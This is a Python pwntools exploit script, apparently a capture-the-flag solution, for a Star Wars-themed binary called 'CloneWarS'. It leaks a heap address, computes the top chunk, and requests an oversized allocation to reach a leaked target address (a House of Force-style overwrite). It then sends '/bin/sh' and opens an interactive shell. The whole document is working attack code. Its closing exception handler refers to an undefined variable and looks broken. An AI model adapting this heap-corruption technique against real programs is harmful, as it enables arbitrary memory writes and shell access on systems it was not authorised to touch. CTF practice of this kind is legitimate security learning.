from pwn import *
binaryFile = "./CloneWarS"

elf = ELF(binaryFile)
p = process(binaryFile)

context.arch = 'amd64'

#R2D2 gives us our leak
def r2(junk):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("R2? ", str(junk))
    p.recvuntil("R2D2 IS .... ")
    leak = int(p.recvuntil(" "))
    return leak

def starship(size, kind, capacity):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Master, the amount of starships: ", str(size))
    p.sendlineafter("What kind of starships?: ", kind)
    p.sendlineafter("Capacity of troopers in the starships: ", str(capacity))

def deathstar(size):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Assemble death star: ", str(size))

# Lightsabers function doesnt do anything for us so we can disregard

def troopers(text):
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("What kind of troopers?: ", text)

starship(8, ('ff' *0x24), 0x24)
heapLeak = r2("gabe")


print(heapLeak)
print('hex: ', hex(heapLeak))
print("Heap leak:",(hex(heapLeak)))

# Fill, 8 of 64 bits, long 
fillSize = 0x8

heap_base = heapLeak - 0x1380 
print(heap_base)

# offset
offset = 0x1280 

# top chunk = base + offset + (size * 4)
topChunk = heap_base + offset + fillSize * 4

print("topchunk: ", hex(topChunk))
print("Heap base : ", hex(heap_base))

# get the win address and convert to hex
p.sendlineafter("Your choice: ", "6")
p.recvuntil("File is at: ")
winAdd = int(p.recvline()[:-1])
print("File leak :",(hex(winAdd)))
p.sendlineafter("Your choice: ", "2")
deathstar(winAdd - topChunk)  


troopers("/bin/sh\x00")

p.sendlineafter("Your choice: ", "6")
p.sendlineafter("Your choice: ", "6")
p.interactive()


@atexception.register
def handler():
    log.error(r.recv())
with context.local(log_level = 'error'):
    atexception.register(handler)